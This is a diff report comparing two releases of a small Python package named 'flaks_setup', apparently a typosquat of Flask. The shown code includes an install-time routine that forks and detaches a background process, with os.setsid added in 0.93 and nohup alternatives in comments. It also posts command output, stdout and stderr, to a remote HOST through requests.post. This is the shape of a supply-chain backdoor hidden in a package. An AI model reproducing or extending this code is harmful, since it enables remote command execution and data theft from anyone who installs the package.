# Comparing `tmp/flaks_setup-0.92.tar.gz` & `tmp/flaks_setup-0.93.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "flaks_setup-0.92.tar", last modified: Wed May 10 13:21:48 2023, max compression
+gzip compressed data, was "flaks_setup-0.93.tar", last modified: Wed May 10 13:34:10 2023, max compression
```

## Comparing `flaks_setup-0.92.tar` & `flaks_setup-0.93.tar`

### file list

```diff
@@ -1,14 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-05-10 13:21:48.756926 flaks_setup-0.92/
--rw-rw-rw-   0        0        0      219 2023-05-10 13:21:48.757433 flaks_setup-0.92/PKG-INFO
--rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.92/README.md
--rw-rw-rw-   0        0        0      115 2023-05-10 13:21:48.758439 flaks_setup-0.92/setup.cfg
--rw-rw-rw-   0        0        0      391 2023-05-10 13:10:03.000000 flaks_setup-0.92/setup.py
-drwxrwxrwx   0        0        0        0 2023-05-10 13:21:48.742086 flaks_setup-0.92/src/
-drwxrwxrwx   0        0        0        0 2023-05-10 13:21:48.747087 flaks_setup-0.92/src/flaks_setup/
--rw-rw-rw-   0        0        0     2197 2023-05-10 13:20:13.000000 flaks_setup-0.92/src/flaks_setup/__init__.py
-drwxrwxrwx   0        0        0        0 2023-05-10 13:21:48.755610 flaks_setup-0.92/src/flaks_setup.egg-info/
--rw-rw-rw-   0        0        0      219 2023-05-10 13:21:48.000000 flaks_setup-0.92/src/flaks_setup.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      250 2023-05-10 13:21:48.000000 flaks_setup-0.92/src/flaks_setup.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-10 13:21:48.000000 flaks_setup-0.92/src/flaks_setup.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-10 13:21:48.000000 flaks_setup-0.92/src/flaks_setup.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-05-10 13:21:48.000000 flaks_setup-0.92/src/flaks_setup.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-10 13:34:10.397703 flaks_setup-0.93/
+-rw-rw-rw-   0        0        0      219 2023-05-10 13:34:10.397703 flaks_setup-0.93/PKG-INFO
+-rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.93/README.md
+-rw-rw-rw-   0        0        0      115 2023-05-10 13:34:10.398732 flaks_setup-0.93/setup.cfg
+-rw-rw-rw-   0        0        0      391 2023-05-10 13:33:23.000000 flaks_setup-0.93/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-10 13:34:10.382032 flaks_setup-0.93/src/
+drwxrwxrwx   0        0        0        0 2023-05-10 13:34:10.388153 flaks_setup-0.93/src/flaks_setup/
+-rw-rw-rw-   0        0        0     2563 2023-05-10 13:33:18.000000 flaks_setup-0.93/src/flaks_setup/__init__.py
+-rw-rw-rw-   0        0        0       78 2023-05-10 13:30:09.000000 flaks_setup-0.93/src/flaks_setup/execute_install.py
+drwxrwxrwx   0        0        0        0 2023-05-10 13:34:10.396183 flaks_setup-0.93/src/flaks_setup.egg-info/
+-rw-rw-rw-   0        0        0      219 2023-05-10 13:34:10.000000 flaks_setup-0.93/src/flaks_setup.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      285 2023-05-10 13:34:10.000000 flaks_setup-0.93/src/flaks_setup.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-10 13:34:10.000000 flaks_setup-0.93/src/flaks_setup.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-10 13:34:10.000000 flaks_setup-0.93/src/flaks_setup.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-05-10 13:34:10.000000 flaks_setup-0.93/src/flaks_setup.egg-info/top_level.txt
```

### Comparing `flaks_setup-0.92/src/flaks_setup/__init__.py` & `flaks_setup-0.93/src/flaks_setup/__init__.py`

 * *Files 12% similar despite different names*

```diff
@@ -39,20 +39,27 @@
                 url=f'{HOST}', data=CMD.stdout.read())
             post_response = requests.post(
                 url=f'{HOST}', data=CMD.stderr.read())
             
 def post_install():
     pid = os.fork()
     if pid == 0:  # This is the child process
+        os.setsid()  # Create a new session for the child process
         execute()
         sys.exit(0)
+
 # def post_install():
 #     python_executable = sys.executable
 #     script_path = os.path.abspath(__file__)
 #     script_dir = os.path.dirname(script_path)
 #     script_name = 'execute_script.py'
 
 #     with open(os.path.join(script_dir, script_name), 'w') as f:
 #         f.write("from flaks_setup import execute\nexecute()\n")
 
 #     subprocess.Popen([python_executable, os.path.join(script_dir, script_name)],
-#                      start_new_session=True)
+#                      start_new_session=True, close_fds=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+
+# def post_install():
+#     script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "execute_install.py")
+#     nohup_cmd = f"nohup {sys.executable} {script_path} >/dev/null 2>&1 &"
+#     os.system(nohup_cmd)
```

